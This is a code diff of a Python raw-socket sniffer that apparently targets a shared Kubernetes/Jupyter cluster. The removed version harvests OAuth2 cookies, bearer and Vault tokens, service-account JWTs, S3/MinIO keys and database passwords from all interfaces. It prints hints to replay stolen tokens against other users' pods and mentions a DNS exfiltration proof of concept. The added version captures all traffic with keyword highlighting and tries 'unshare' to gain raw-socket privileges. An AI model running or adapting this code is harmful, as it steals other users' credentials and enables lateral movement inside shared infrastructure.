@@ -1,349 +1,366 @@
 #!/usr/bin/env python3
 """
-full_sniff.py
-Captures tokens, cookies, SA tokens, Vault tokens,
-S3 creds, DB passwords from all interfaces
+sniff_all.py
+Logs ALL traffic. Optional filters via command line.
+Usage:
+  python3 sniff_all.py                    # all traffic, all interfaces
+  python3 sniff_all.py -i eth0            # specific interface
+  python3 sniff_all.py -p 10443           # specific port
+  python3 sniff_all.py -i lo -p 8080      # combined
+  python3 sniff_all.py --no-payload       # headers only, no body
+  python3 sniff_all.py --keywords-only    # back to filtered mode
 """
-import socket, struct, re, os, sys
+
+import socket, struct, re, os, sys, argparse
 from datetime import datetime
-from collections import defaultdict
 
-# ── Config ────────────────────────────────────────────────
-INTERFACES  = ["lo", "eth0", "tunl0"]
-OUTFILE     = f"sniff_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+# ── Args ──────────────────────────────────────────────────
+parser = argparse.ArgumentParser()
+parser.add_argument("-i", "--interface",
+                    default="any",
+                    help="Interface (eth0/lo/any)")
+parser.add_argument("-p", "--port",
+                    type=int, default=None,
+                    help="Filter by port")
+parser.add_argument("--no-payload",
+                    action="store_true",
+                    help="Skip payload, headers only")
+parser.add_argument("--keywords-only",
+                    action="store_true",
+                    help="Only log interesting lines")
+parser.add_argument("-o", "--output",
+                    default=None,
+                    help="Output file (default: auto)")
+args = parser.parse_args()
 
-# ── What to extract ───────────────────────────────────────
-EXTRACTORS = {
-    "OAUTH2_COOKIE": [
-        r'_oauth2_proxy=([^;\s\r\n]{10,})',
-    ],
-    "BEARER_TOKEN": [
-        r'[Aa]uthorization:\s*[Bb]earer\s+([^\s\r\n]{10,})',
-        r'[Aa]uthorization:\s*[Tt]oken\s+([^\s\r\n]{10,})',
-    ],
-    "VAULT_TOKEN": [
-        r'[Xx]-[Vv]ault-[Tt]oken:\s*([^\s\r\n]{10,})',
-        r'"client_token"\s*:\s*"([^"]{10,})"',
-        r's\.[A-Za-z0-9]{24}',  # Vault token format
-    ],
-    "K8S_SA_TOKEN": [
-        r'[Aa]uthorization:\s*[Bb]earer\s+(eyJ[^\s\r\n]{50,})',
-    ],
-    "COOKIE_HEADER": [
-        r'[Cc]ookie:\s*([^\r\n]{20,})',
-        r'[Ss]et-[Cc]ookie:\s*([^\r\n]{20,})',
-    ],
-    "S3_ACCESS_KEY": [
-        r'[Aa]ws-[Aa]ccess-[Kk]ey-[Ii]d[=:\s]+([A-Z0-9]{16,})',
-        r'[Aa]ccess[Kk]ey[Ii][Dd][=:\s"]+([A-Za-z0-9]{16,})',
-        r'X-Amz-Credential=([^/&\s]+)',
-    ],
-    "S3_SECRET_KEY": [
-        r'[Aa]ws-[Ss]ecret[=:\s]+([A-Za-z0-9+/]{20,})',
-        r'[Ss]ecret[Aa]ccess[Kk]ey[=:\s"]+([A-Za-z0-9+/]{20,})',
-    ],
-    "DB_PASSWORD": [
-        r'[Pp]assword[=:\s"]+([^\s"&\r\n]{6,})',
-        r'[Pp]asswd[=:\s"]+([^\s"&\r\n]{6,})',
-        r'postgresql://[^:]+:([^@]+)@',
-        r'mongodb://[^:]+:([^@]+)@',
-        r'redis://:([^@]+)@',
-    ],
-    "KEYCLOAK_TOKEN": [
-        r'"access_token"\s*:\s*"([^"]{20,})"',
-        r'"refresh_token"\s*:\s*"([^"]{20,})"',
-        r'"id_token"\s*:\s*"([^"]{20,})"',
-    ],
-    "API_KEY": [
-        r'[Xx]-[Aa][Pp][Ii]-[Kk]ey:\s*([^\s\r\n]{10,})',
-        r'api[_-]?key[=:\s"]+([A-Za-z0-9\-_]{16,})',
-    ],
-    "MINIO_CREDS": [
-        r'SPARROW_OBJS_ACCESS[=:\s]+([^\s\r\n]{8,})',
-        r'SPARROW_OBJS_SECRET[=:\s]+([^\s\r\n]{8,})',
-        r'min-ap[0-9]+-[^\s"]+',  # MinIO URL
-    ],
-    "INTERNAL_URL": [
-        r'https?://[a-z0-9\-]+\.(?:intra|sparrow|echonet)'
-        r'[^\s\r\n"\']{5,}',
-    ],
-}
+INTERFACE     = args.interface
+FILTER_PORT   = args.port
+NO_PAYLOAD    = args.no_payload
+KEYWORDS_ONLY = args.keywords_only
+OUTFILE       = args.output or \
+    f"sniff_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
 
-# Port labels for context
+INTERFACES = (
+    ["lo", "eth0", "tunl0"]
+    if INTERFACE == "any"
+    else [INTERFACE]
+)
+
 PORT_LABELS = {
-    10443: "Jupyter-TLS",
-    8080:  "VS-Code/API",
-    8081:  "Jupyter",
-    8200:  "Vault",
-    8443:  "oauth2-proxy",
-    443:   "HTTPS",
-    5432:  "PostgreSQL",
-    27017: "MongoDB",
-    6379:  "Redis",
-    9090:  "Prometheus",
-    6443:  "k8s-API",
-    2379:  "etcd",
-    53:    "DNS",
-    9000:  "MinIO",
+    10443: "Jupyter-TLS",  8080: "VSCode/API",
+    8081:  "Jupyter",      8200: "Vault",
+    8443:  "oauth2-proxy", 443:  "HTTPS",
+    5432:  "PostgreSQL",   27017:"MongoDB",
+    6379:  "Redis",        9090: "Prometheus",
+    6443:  "k8s-API",      2379: "etcd",
+    53:    "DNS",          9000: "MinIO",
+    80:    "HTTP",         8888: "Jupyter-int",
+    10250: "Kubelet",
 }
 
-# ── State ─────────────────────────────────────────────────
-found    = defaultdict(set)  # type → set of unique values
-sessions = {}                 # ip:port → partial data
+KEYWORDS = [
+    "authorization", "bearer", "token", "cookie",
+    "password", "secret", "vault", "oauth", "key",
+    "access_key", "api_key", "credential",
+]
 
-def log(f, msg, important=False):
-    ts   = datetime.now().strftime("%H:%M:%S.%f")[:-3]
-    prefix = "!!!" if important else "   "
-    line = f"[{ts}] {prefix} {msg}"
-    print(line)
-    f.write(line + "\n")
-    f.flush()
+# ── Helpers ───────────────────────────────────────────────
 
-def extract_all(text, src, dst, sport, dport, f):
-    """Run all extractors on payload text"""
-    found_something = False
+def port_label(p):
+    return f"{p}({PORT_LABELS[p]})" \
+           if p in PORT_LABELS else str(p)
 
-    for label, patterns in EXTRACTORS.items():
-        for pattern in patterns:
-            matches = re.findall(pattern, text,
-                                re.IGNORECASE)
-            for match in matches:
-                if isinstance(match, tuple):
-                    match = match[0]
-                match = match.strip()
-                if len(match) < 6:
-                    continue
-                # Deduplicate
-                if match in found[label]:
-                    continue
-                found[label].add(match)
+def is_interesting(text):
+    tl = text.lower()
+    return any(kw in tl for kw in KEYWORDS)
 
-                sport_label = PORT_LABELS.get(sport, sport)
-                dport_label = PORT_LABELS.get(dport, dport)
-
-                log(f, f"{'─'*55}", important=True)
-                log(f, f"TYPE:    {label}",
-                    important=True)
-                log(f, f"FLOW:    {src}:{sport_label} → "
-                        f"{dst}:{dport_label}",
-                    important=True)
-                log(f, f"VALUE:   {match[:120]}",
-                    important=True)
-                found_something = True
-
-                # Special handling per type
-                if label == "K8S_SA_TOKEN":
-                    # Decode JWT payload
-                    try:
-                        import base64, json
-                        parts = match.split('.')
-                        pad   = parts[1] + '=' * \
-                                (4 - len(parts[1]) % 4)
-                        payload = json.loads(
-                            base64.b64decode(pad)
-                        )
-                        ns  = payload.get(
-                            'kubernetes.io', {})\
-                            .get('namespace', '?')
-                        sa  = payload.get(
-                            'kubernetes.io', {})\
-                            .get('serviceaccount', {})\
-                            .get('name', '?')
-                        log(f, f"  → k8s SA: {ns}/{sa}",
-                            important=True)
-                    except:
-                        pass
-
-                if label == "VAULT_TOKEN":
-                    # Try to look up token info
-                    log(f, f"  → Try: curl -H "
-                           f"'X-Vault-Token: {match}' "
-                           f"$VAULT/v1/auth/token/lookup-self",
-                        important=True)
-
-                if label in ["OAUTH2_COOKIE",
-                             "BEARER_TOKEN"]:
-                    log(f, f"  → Use against port 10443 "
-                           f"on other user pods!",
-                        important=True)
-
-    return found_something
-
-def open_raw_socket(iface):
-    """Open raw socket on interface"""
+def fmt_payload(payload, max_bytes=2048):
+    """Format raw payload — show both hex and text"""
     try:
-        s = socket.socket(
-            socket.AF_PACKET,
-            socket.SOCK_RAW,
-            socket.htons(0x0003)
-        )
-        s.bind((iface, 0))
-        s.settimeout(0.1)
-        return s
-    except Exception as e:
-        print(f"  Cannot open {iface}: {e}")
-        return None
+        text = payload.decode("utf-8", errors="replace")
+        # Clean up non-printable except newlines/tabs
+        clean = re.sub(r'[^\x09\x0a\x0d\x20-\x7e]',
+                       '.', text)
+        return clean[:max_bytes]
+    except:
+        # Hex dump for binary
+        hex_str = payload[:256].hex()
+        return ' '.join(hex_str[i:i+2]
+                       for i in range(0, len(hex_str), 2))
 
-def sniff_interface(iface, f, stats):
-    """Process one batch of packets from interface"""
-    sock = stats.get(f"sock_{iface}")
-    if not sock:
-        return
+def open_sockets(interfaces):
+    socks = {}
+    for iface in interfaces:
+        try:
+            s = socket.socket(
+                socket.AF_PACKET,
+                socket.SOCK_RAW,
+                socket.htons(0x0003)
+            )
+            s.bind((iface, 0))
+            s.settimeout(0.05)
+            socks[iface] = s
+            print(f"  ✓ Opened {iface}")
+        except Exception as e:
+            print(f"  ✗ Cannot open {iface}: {e}")
+    return socks
 
-    try:
-        raw, _ = sock.recvfrom(65535)
-    except socket.timeout:
-        return
-    except Exception:
-        return
+# ── Packet handler ────────────────────────────────────────
 
+def handle_packet(raw, iface, f, stats):
     stats["total"] += 1
 
-    # Skip Ethernet header
+    # ── Ethernet ──────────────────────────────────────────
     if len(raw) < 14:
         return
     eth_type = struct.unpack("!H", raw[12:14])[0]
-    if eth_type != 0x0800:
+
+    # Handle both with and without ethernet header
+    if eth_type == 0x0800:
+        ip_data = raw[14:]
+    elif eth_type == 0x86DD:
+        # IPv6 — log minimally
+        write(f, f"[IPv6] iface={iface} "
+                 f"len={len(raw)}")
         return
-    ip_data = raw[14:]
+    else:
+        ip_data = raw  # assume raw IP
 
     if len(ip_data) < 20:
         return
 
-    # Parse IP
+    # ── IP ────────────────────────────────────────────────
     iph   = struct.unpack("!BBHHHBBH4s4s", ip_data[:20])
     proto = iph[6]
     src   = socket.inet_ntoa(iph[8])
     dst   = socket.inet_ntoa(iph[9])
     ihl   = (iph[0] & 0xF) * 4
+    ttl   = iph[5]
+    total_len = iph[2]
     rest  = ip_data[ihl:]
 
     # ── TCP ───────────────────────────────────────────────
-    if proto == 6 and len(rest) >= 20:
+    if proto == 6:
+        if len(rest) < 20:
+            return
         tcph   = struct.unpack("!HHLLBBHHH", rest[:20])
         sport  = tcph[0]
         dport  = tcph[1]
+        seq    = tcph[2]
+        ack    = tcph[3]
+        flags  = tcph[5]
+        win    = tcph[6]
         offset = (tcph[4] >> 4) * 4
         payload = rest[offset:]
 
-        if not payload:
+        # Decode flags
+        flag_str = "".join([
+            "S" if flags & 0x02 else "",
+            "A" if flags & 0x10 else "",
+            "F" if flags & 0x01 else "",
+            "R" if flags & 0x04 else "",
+            "P" if flags & 0x08 else "",
+        ]) or "."
+
+        # Port filter
+        if FILTER_PORT and \
+           sport != FILTER_PORT and \
+           dport != FILTER_PORT:
             return
 
-        # Reassemble partial HTTP (session tracking)
-        sess_key = f"{src}:{sport}-{dst}:{dport}"
-        try:
-            text = payload.decode("utf-8", errors="replace")
-        except:
+        stats["tcp"] += 1
+
+        # Build header line
+        sl = port_label(sport)
+        dl = port_label(dport)
+        header = (
+            f"TCP  {iface:5} "
+            f"{src:15}:{sl:20} → "
+            f"{dst:15}:{dl:20} "
+            f"flags={flag_str:4} "
+            f"seq={seq} "
+            f"len={len(payload)}"
+        )
+
+        # Payload text
+        payload_text = ""
+        if payload and not NO_PAYLOAD:
+            ptext = fmt_payload(payload)
+            if ptext.strip():
+                payload_text = ptext
+
+        # Decide whether to log
+        if KEYWORDS_ONLY:
+            if not is_interesting(
+                payload_text + header
+            ):
+                return
+
+        # Write
+        write(f, "─" * 80)
+        write(f, header)
+
+        if payload_text:
+            # Split into lines for readability
+            lines = payload_text.splitlines()
+            for line in lines:
+                if line.strip():
+                    write(f, f"  | {line}")
+
+            # Highlight interesting lines
+            for line in lines:
+                if is_interesting(line):
+                    write(f,
+                          f"  *** {line.strip()[:150]}")
+                    stats["hits"] += 1
+
+        stats["logged"] += 1
+
+    # ── UDP ───────────────────────────────────────────────
+    elif proto == 17:
+        if len(rest) < 8:
             return
-
-        # Buffer partial HTTP
-        if sess_key in sessions:
-            sessions[sess_key] += text
-            text = sessions[sess_key]
-            if len(text) > 8192:
-                del sessions[sess_key]
-        elif any(text.startswith(m) for m in [
-            "GET ", "POST ", "PUT ", "DELETE ",
-            "PATCH ", "HTTP/", "OPTIONS "
-        ]):
-            sessions[sess_key] = text
-
-        if extract_all(text, src, dst,
-                       sport, dport, f):
-            stats["hits"] += 1
-
-    # ── UDP/DNS ───────────────────────────────────────────
-    elif proto == 17 and len(rest) >= 8:
-        sport = struct.unpack("!H", rest[:2])[0]
-        dport = struct.unpack("!H", rest[2:4])[0]
+        sport, dport = struct.unpack("!HH", rest[:2])
         payload = rest[8:]
 
-        if sport == 53 or dport == 53:
-            try:
-                text = payload.decode(
-                    "utf-8", errors="replace"
-                )
-                # DNS queries with encoded data
-                # (our exfil PoC goes through here)
-                domains = re.findall(
-                    r'([a-zA-Z0-9+/=]{20,}\.'
-                    r'[a-z0-9\-\.]{5,})',
-                    text
-                )
-                for d in domains:
-                    if d not in found["DNS_EXFIL"]:
-                        found["DNS_EXFIL"].add(d)
-                        log(f, f"DNS QUERY: {d}")
-            except:
-                pass
+        if FILTER_PORT and \
+           sport != FILTER_PORT and \
+           dport != FILTER_PORT:
+            return
 
+        stats["udp"] += 1
+
+        sl = port_label(sport)
+        dl = port_label(dport)
+
+        write(f, "─" * 80)
+        write(f, (
+            f"UDP  {iface:5} "
+            f"{src:15}:{sl:20} → "
+            f"{dst:15}:{dl:20} "
+            f"len={len(payload)}"
+        ))
+
+        if payload and not NO_PAYLOAD:
+            ptext = fmt_payload(payload)
+            if ptext.strip():
+                for line in ptext.splitlines():
+                    if line.strip():
+                        write(f, f"  | {line}")
+
+        stats["logged"] += 1
+
+    # ── ICMP ──────────────────────────────────────────────
+    elif proto == 1:
+        if len(rest) < 4:
+            return
+        icmp_type, icmp_code = rest[0], rest[1]
+        write(f, (
+            f"ICMP {iface:5} "
+            f"{src:15} → {dst:15} "
+            f"type={icmp_type} code={icmp_code}"
+        ))
+        stats["logged"] += 1
+
+    # ── Other ─────────────────────────────────────────────
+    else:
+        write(f, (
+            f"IP   {iface:5} "
+            f"{src} → {dst} "
+            f"proto={proto} "
+            f"len={total_len}"
+        ))
+        stats["logged"] += 1
+
+
+# ── Writer ────────────────────────────────────────────────
+
+_f = None
+
+def write(f, msg):
+    ts   = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+    line = f"[{ts}] {msg}"
+    print(line)
+    f.write(line + "\n")
+    f.flush()
+
+
+# ── Main ──────────────────────────────────────────────────
 
 def main():
-    print(f"[*] Full cluster sniffer")
-    print(f"[*] Output: {OUTFILE}")
-    print(f"[*] Interfaces: {INTERFACES}")
-    print(f"[*] Ctrl+C to stop and see summary\n")
+    print(f"sniff_all.py")
+    print(f"  Interface:    {INTERFACE}")
+    print(f"  Port filter:  {FILTER_PORT or 'ALL'}")
+    print(f"  Mode:         "
+          f"{'keywords-only' if KEYWORDS_ONLY else 'ALL traffic'}")
+    print(f"  Payload:      "
+          f"{'headers only' if NO_PAYLOAD else 'full'}")
+    print(f"  Output:       {OUTFILE}\n")
 
-    # Check root
     if os.geteuid() != 0:
-        # Try via unshare
-        print("Not root — trying unshare...")
+        print("Not root! Trying unshare...")
         os.execvp("unshare", [
-            "unshare", "--user", "--map-root-user",
-            "--", sys.executable
+            "unshare", "--user",
+            "--map-root-user", "--",
+            sys.executable
         ] + sys.argv)
+        sys.exit(1)
 
-    stats = {"total": 0, "hits": 0}
+    socks = open_sockets(INTERFACES)
+    if not socks:
+        print("No interfaces opened!")
+        sys.exit(1)
 
-    with open(OUTFILE, "w") as f:
-        log(f, f"Sniffer started: {datetime.now()}")
-        log(f, f"Interfaces: {INTERFACES}")
-        log(f, f"Extractors: {list(EXTRACTORS.keys())}\n")
+    stats = {
+        "total": 0, "tcp": 0, "udp": 0,
+        "logged": 0, "hits": 0
+    }
 
-        # Open all sockets
-        for iface in INTERFACES:
-            sock = open_raw_socket(iface)
-            if sock:
-                stats[f"sock_{iface}"] = sock
-                log(f, f"Listening on {iface}")
+    with open(OUTFILE, "w", buffering=1) as f:
+        write(f, f"CAPTURE START: {datetime.now()}")
+        write(f, f"Interface: {INTERFACE}")
+        write(f, f"Port filter: {FILTER_PORT or 'ALL'}")
+        write(f, f"Mode: "
+                 f"{'keywords-only' if KEYWORDS_ONLY else 'full'}")
+        write(f, "─" * 80)
 
-        # Round-robin across all interfaces
         try:
             while True:
-                for iface in INTERFACES:
-                    sniff_interface(iface, f, stats)
+                for iface, sock in socks.items():
+                    try:
+                        raw, _ = sock.recvfrom(65535)
+                        handle_packet(
+                            raw, iface, f, stats
+                        )
+                    except socket.timeout:
+                        continue
+                    except Exception as e:
+                        continue
 
-                # Print stats every 10k packets
-                if stats["total"] % 10000 == 0 \
+                # Stats every 5000 packets
+                if stats["total"] % 5000 == 0 \
                    and stats["total"] > 0:
-                    log(f, f"[stats] {stats['total']} "
-                           f"packets, "
-                           f"{stats['hits']} hits")
+                    write(f, (
+                        f"[STATS] total={stats['total']} "
+                        f"tcp={stats['tcp']} "
+                        f"udp={stats['udp']} "
+                        f"logged={stats['logged']} "
+                        f"hits={stats['hits']}"
+                    ))
 
         except KeyboardInterrupt:
             pass
 
-        # ── Final summary ─────────────────────────────────
-        print(f"\n{'='*60}")
-        print(f"CAPTURE SUMMARY")
-        print(f"{'='*60}")
-        f.write(f"\n{'='*60}\nSUMMARY\n{'='*60}\n")
+        write(f, "─" * 80)
+        write(f, f"CAPTURE END: {datetime.now()}")
+        write(f, f"total={stats['total']} "
+                 f"tcp={stats['tcp']} "
+                 f"udp={stats['udp']} "
+                 f"logged={stats['logged']} "
+                 f"interesting={stats['hits']}")
 
-        for label, values in found.items():
-            if not values:
-                continue
-            summary = (f"\n[{label}] "
-                       f"{len(values)} unique values:")
-            print(summary)
-            f.write(summary + "\n")
-            for v in values:
-                line = f"  {v[:120]}"
-                print(line)
-                f.write(line + "\n")
+    print(f"\n[*] Saved to {OUTFILE}")
 
-        print(f"\n[*] Total packets: {stats['total']}")
-        print(f"[*] Total hits:    {stats['hits']}")
-        print(f"[*] Saved to:      {OUTFILE}")
 
 if __name__ == "__main__":
     main()
